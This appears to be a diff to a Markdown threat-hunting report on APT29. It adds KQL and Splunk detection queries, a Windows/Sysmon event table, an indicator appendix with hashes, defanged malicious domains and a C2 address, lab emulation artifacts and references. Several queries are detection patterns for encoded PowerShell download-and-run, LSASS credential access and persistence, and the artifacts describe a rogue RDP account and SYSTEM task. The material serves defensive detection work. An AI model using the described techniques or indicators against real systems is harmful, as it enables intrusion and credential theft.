-Establishes outbound communication with the *Dropbox API-based C2
-
-Optionally connects to primary and secondary C2 servers using Microsoft Graph API
-
-Uploads collected data and command execution output to Dropbox
-
-![](/assets/img/posts/apt29-hunting/img-220.png)
-
-![](/assets/img/posts/apt29-hunting/img-221.png)
-
-![](/assets/img/posts/apt29-hunting/img-222.png)
-
-![](/assets/img/posts/apt29-hunting/img-223.png)
-
-![](/assets/img/posts/apt29-hunting/img-224.png)
-
-![](/assets/img/posts/apt29-hunting/img-225.png)
-
-SPL Queries:
-
-index=windows EventCode=4688 (NewProcessName="powershell.exe" OR Process_Command_Line="powershell*") | where like(Process_Command_Line,"%EncodedCommand%") OR like(Process_Command_Line,"%IEX%") | stats count by ComputerName, NewProcessName, Process_Command_Line, ParentProcessName index=windows (EventCode=4688 OR EventCode=10) (ProcessName="lsass.exe" OR TargetImage="lsass.exe") | stats count by ComputerName, ProcessName, SourceImage, TargetImage index=windows EventCode=4688 | where like(NewProcessName,"%AppData%") OR like(NewProcessName,"%Temp%") | stats count by NewProcessName, ParentProcessName, ComputerName index=windows EventCode=4698 | stats count by TaskName, Author, Command, ComputerName index=windows EventCode=4657 Registry_Path="\Run\" OR Registry_Path="\RunOnce\" | stats count by Registry_Path, New_Value, ComputerName index=windows EventCode=4688 ParentProcessName="wmiprvse.exe" | stats count by ComputerName, NewProcessName, Process_Command_Line index=windows EventCode=4688 NewProcessName="rundll32.exe" | where like(Process_Command_Line,"%AppData%") OR like(Process_Command_Line,"%Temp%") | stats count by ComputerName, Process_Command_Line index=proxy OR index=network (dest_port=443 OR dest_port=8443) | stats count by src_ip, dest_ip, dest_domain | where count < 5 index=windows EventCode=4624 LogonType=3 | stats count by Account_Name, ComputerName, Source_Network_Address index=windows EventCode=4663 Object_Name="\AppData\" OR Object_Name="\Temp\" | stats count by Object_Name, ProcessName, ComputerName
+<table>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-220.png" width="400" alt="attachment drop chain"/></td><td><img src="/assets/img/posts/apt29-hunting/img-221.png" width="400" alt="attachment drop chain"/></td></tr>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-222.png" width="400" alt="dropbox c2"/></td><td><img src="/assets/img/posts/apt29-hunting/img-223.png" width="400" alt="dll hijack"/></td></tr>
+</table>
+
+---
+
+## 10 · Detection Content Appendix
+
+#### 10.1 KQL (Microsoft Defender / Advanced Hunting)
+
+**Suspicious file drops on Desktop**
+```kql
+DeviceFileEvents
+| where FolderPath endswith @"\Desktop"
+| where FileName contains "Attack" or FileName contains "Update"
+   or FileName endswith ".hta" or FileName endswith ".exe"
+```
+
+**LOLBin / mshta spawning PowerShell**
+```kql
+DeviceProcessEvents
+| where InitiatingProcessFileName == "mshta.exe"
+| where FileName == "powershell.exe" or FileName == "pwsh.exe"
+```
+
+**Encoded PowerShell + network correlation**
+```kql
+DeviceProcessEvents
+| where FileName ==~ "powershell.exe"
+| where ProcessCommandLine has_any ("-enc", "-EncodedCommand", "-nop", "-noni", "-w hidden")
+   or ProcessCommandLine matches "[A-Za-z0-9+/]{20,}={0,2}"
+   or ProcessCommandLine contains "FromBase64String"
+| join kind=leftouter (
+    DeviceNetworkEvents
+    | where InitiatingProcessFileName ==~ "powershell.exe"
+    | project DeviceId, RemoteIP, RemotePort, InitiatingProcessCommandLine
+  ) on DeviceId
+| project Timestamp, DeviceName, ProcessCommandLine, RemoteIP, RemotePort
+```
+
+**Scheduled-task creation**
+```kql
+DeviceEvents
+| where ActionType in ("ScheduledTaskCreated", "ScheduledTaskUpdated")
+| where AdditionalFields contains "powershell.exe"
+   or AdditionalFields contains "SystemUpdate"
+   or AdditionalFields contains "Update" or AdditionalFields contains "Maintenance"
+| project Timestamp, DeviceName, AccountName, AdditionalFields
+```
+
+#### 10.2 Splunk (SPL)
+
+```spl
+index=windows EventCode=4688
+(NewProcessName="powershell.exe" OR Process_Command_Line="powershell*")
+| where like(Process_Command_Line,"%EncodedCommand%") OR like(Process_Command_Line,"%IEX%")
+| stats count by ComputerName, NewProcessName, Process_Command_Line, ParentProcessName
+```
+```spl
+index=windows (EventCode=4688 OR EventCode=10)
+(ProcessName="lsass.exe" OR TargetImage="lsass.exe")
+| stats count by ComputerName, ProcessName, SourceImage, TargetImage
+```
+```spl
+index=windows EventCode=4688
+| where like(NewProcessName,"%AppData%") OR like(NewProcessName,"%Temp%")
+| stats count by NewProcessName, ParentProcessName, ComputerName
+```
+```spl
+index=windows EventCode=4698
+| stats count by TaskName, Author, Command, ComputerName
+```
+```spl
+index=windows EventCode=4657
+Registry_Path="\Run\" OR Registry_Path="\RunOnce\"
+| stats count by Registry_Path, New_Value, ComputerName
+```
+```spl
+index=windows EventCode=4688 ParentProcessName="wmiprvse.exe"
+| stats count by ComputerName, NewProcessName, Process_Command_Line
+```
+```spl
+index=windows EventCode=4688 NewProcessName="rundll32.exe"
+| where like(Process_Command_Line,"%AppData%") OR like(Process_Command_Line,"%Temp%")
+| stats count by ComputerName, Process_Command_Line
+```
+```spl
+index=proxy OR index=network (dest_port=443 OR dest_port=8443)
+| stats count by src_ip, dest_ip, dest_domain
+| where count < 5
+```
+```spl
+index=windows EventCode=4624 LogonType=3
+| stats count by Account_Name, ComputerName, Source_Network_Address
+```
+```spl
+index=windows EventCode=4663
+Object_Name="\AppData\" OR Object_Name="\Temp\"
+| stats count by Object_Name, ProcessName, ComputerName
+```
+
+<table>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-224.png" width="400" alt="SPL queries"/></td><td><img src="/assets/img/posts/apt29-hunting/img-225.png" width="400" alt="SPL queries"/></td></tr>
+</table>
+
+#### 10.3 Windows / Sysmon Event Reference
+
+| Source | Event ID | Use |
+|--------|----------|-----|
+| Security | 4688 | Process creation |
+| Security | 4104 | PowerShell script-block logging |
+| Security | 4698 | Scheduled task created |
+| Security | 4657 | Registry value modified (Run/RunOnce) |
+| Security | 4624 (Type 3) | Network logon |
+| Security | 4663 | Object access (AppData/Temp) |
+| Sysmon | 1 | Process create |
+| Sysmon | 3 | Network connection |
+| Sysmon | 7 | Image loaded (DLL) |
+| Sysmon | 11 | File create |
+| Sysmon | 13 | Registry set |
+
+---
+
+## 11 · Indicators of Compromise (IOC) Appendix
+
+#### File Hashes
+
+| File | Hash | Type | Campaign |
+|------|------|------|----------|
+| `e-yazi.htm` dropped file | `4527057000a4b06f000983b5b61cc85c10f03691fa17d5c51a9fd0b24280662d` | SHA-256 | Türkiye (Mar 2023) |
+| `a8jet3l1v.exe` (in `e-yazi.iso`) | `948c62e8d953038b6a0030136cb82f55a8251db2c165ca07c01a7568f4644240` | SHA-256 | Türkiye |
+| `e-yazi.html` | `cd4956e4c1a3f7c8c008c4658bb9eba7169aa874c55c12fc748b0ccfe0f4a59a` | SHA-256 | Türkiye |
+| `e-yazi.zip` | `0dd55a234be8e3e07b0eb19f47abe594295889564ce6a9f6e8cc4d3997018839` | SHA-256 | Türkiye |
+| `Note.pdf` | `46c8289301129c0833529495f4f3748b5adff78e18f1427654cb3b597352873e` | SHA-256 | European diplomatic |
+| `note.html` (`..._JC.html`) | `92a5be2893743435b79e94aa64a74233a2240fd790ca948e1cb046da5b4072f1` | SHA-256 | European diplomatic |
+| `Wine event.pdf` | `62ce8e1489a8b87539792c07179faf1db1b46caa39b55902a4d82dcec44d72ae` | SHA-256 | Czechia wine (Apr 2023) |
+| `bmw.iso` | `e306333093eaf198f4d416d25a40784a` | MD5 | Kyiv BMW (May 2023) |
+| `Invintation.zip` | `38719acc6254b7ff70dc8a7723bd8e92` | MD5 | Kyiv charity (May 2023) |
+| Charity payload | `1aee5bf23edb7732fd0e6b2c61a959ce` | MD5 | Kyiv charity |
+| BURNTBATTER | `5569fb4e9140974a80b4b7587b026913` | MD5 | Kyiv charity |
+| DONUT | `595d8ea258ef8d8ec70b0e8a740e903c` | MD5 | Kyiv charity |
+| Dropped | `2d794d1544f933aacbd8da2dad78b381` | MD5 | Kyiv charity |
+| Dropped | `1c0059d976795ceded7c1dd706e74bd1` | MD5 | Kyiv charity |
+| `reception.pdf` | `a8b56b51e085955b5641a9cb74c3b66ee5c37d62703f28b01cfbf7122a7edbfa` | SHA-256 | Split ROOTSAW / ICEBEAT |
+| `invitation.svg` | `4875a9c4af3044db281c5dc02e5386c77f331e3b92e5ae79ff9961d8cd1f7c4f` | SHA-256 | Split ROOTSAW (Jun 2023) |
+| `covenant.exe` | `287543c235cf68695373d367144c51a0236879e614e8ea4634b82e5336785edc` | SHA-256 | Sample analysis |
+| `ds7002.zip` | `3fccf531ff0ae6fedd7c586774b17a2d` | MD5 | DoS phishing (Nov 2018) |
+| `ds7002.lnk` | `6ed0020b0851fb71d5b0076f4ee95f3c` | MD5 | DoS phishing |
+| `cyzfc.dat` | `16bbc967a8b6a365871a05c74a4f345b` | MD5 | DoS phishing |
+| `ds7002.pdf` (decoy) | `313f4808aa2a2073005d219bc68971cd` | MD5 | DoS phishing |
+
+#### Domains / URLs
+
+```text
+tinyurl[.]com/mrxcjsbs                         (Türkiye redirect)
+www[.]willyminiatures[.]com/e-yazi.htm         (ROOTSAW dropper)
+simplesalsamix[.]com/e-yazi.html               (Türkiye 2nd wave)
+parquesanrafael[.]cl/note.html | note.php?ua=  (European diplomatic)
+sylvio[.]com[.]br/form.php                     (Czechia wine)
+gavice[.]ng/event_program.php                  (Kyiv charity payload)
+sgrfh[.]org.pk/wp-content/idx.php?n=ks&q=       (ICEBEAT profiling)
+jmj[.]com/personal/nauerthn_state_gov/*         (2018 malware hosting)
+pandorasong[.]com → 95.216.59[.]92             (2018 C2)
+northshorehealthgm[.]org                        (2018 phishing sender)
+```
+
+#### Lab / Emulation Artifacts
+
+```text
+Victim:   DESKTOP-M8AP5P7\Victim-Machine
+SID:      S-1-5-21-1064308082-3896131167-3449499780-1001
+Attacker: 192.168.253.148 (Kali)  ·  Victim: 192.168.253.147
+Beacons:  4344.exe, evil.exe, t1071.001.exe, onedrive.exe, healthy_stitch.exe, APT29.dll
+Task:     SystemUpdate (hourly, SYSTEM)  ·  Script: APT-shtask.ps1
+Rogue user: APT29 (added to Remote Desktop Users)
+```
+
+---
+
+## 12 · References
+
+1. SVR / Foreign Intelligence Service — <https://en.wikipedia.org/wiki/Foreign_Intelligence_Service_(Russia)>
+2. Sekoia glossary (APT29 / Nobelium / Cozy Bear) — <https://www.sekoia.io/en/glossary/apt29-aka-nobelium-cozy-bear/>
+3. Vectra AI threat actor profile — <https://www.vectra.ai/modern-attack/threat-actors/apt29>
+4. Hedgehog Security — <http://hedgehogsecurity.co.uk/blog/who-is-apt29>
+5. Cyble threat actor profile — <https://cyble.com/threat-actor-profiles/apt-29/>
+6. Mandiant / Google Cloud — APT29 evolving diplomatic phishing — <https://cloud.google.com/blog/topics/threat-intelligence/apt29-evolving-diplomatic-phishing>
+7. Mandiant / Google Cloud — Tracking APT29 phishing campaigns — <https://cloud.google.com/blog/topics/threat-intelligence/tracking-apt29-phishing-campaigns>
+8. RNBO — APT29 attacks embassies using CVE-2023-38831 — <https://www.rnbo.gov.ua/files/2023_YEAR/CYBERCENTER/november/APT29%20attacks%20Embassies%20using%20CVE-2023-38831%20-%20report%20en.pdf>
+9. Mandiant — "Not So Cozy" 2018 campaign — <https://cloud.google.com/blog/topics/threat-intelligence/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign>
+10. Picus Security — APT29 / Cozy Bear evolution — <https://www.picussecurity.com/resource/blog/apt29-cozy-bear-evolution-techniques>
+11. Intel471 — Threat Hunting Case Study: Cozy Bear — <https://www.intel471.com/blog/threat-hunting-case-study-cozy-bear>
+12. MSSP Lab — APT29 malware analysis — <https://mssplab.github.io/threat-hunting/2023/06/02/malware-analysis-apt29.html>
+13. Carbon Black TAU — Invoke-APT29 — <https://github.com/carbonblack/tau-tools/blob/master/threat_emulation/Invoke-APT29/apt29.ps1>
+14. S3N4T0R-0X0 — APT29 Adversary Simulation — <https://github.com/S3N4T0R-0X0/APT29-Adversary-Simulation>
+15. MITRE ATT&CK — [T1566.001](https://attack.mitre.org/techniques/T1566/001/) · [T1059.001](https://attack.mitre.org/techniques/T1059/001/) · [T1053.005](https://attack.mitre.org/techniques/T1053/005/) · [T1021.001](https://attack.mitre.org/techniques/T1021/001/) · [T1003.001](https://attack.mitre.org/techniques/T1003/001/) · [T1071.001](https://attack.mitre.org/techniques/T1071/001/)
+
+---
+
+<div align="center">
+
+*Report compiled for defensive research and education. All offensive activity was performed in an isolated lab.*
+
+**— End of Report —**
+
+</div>
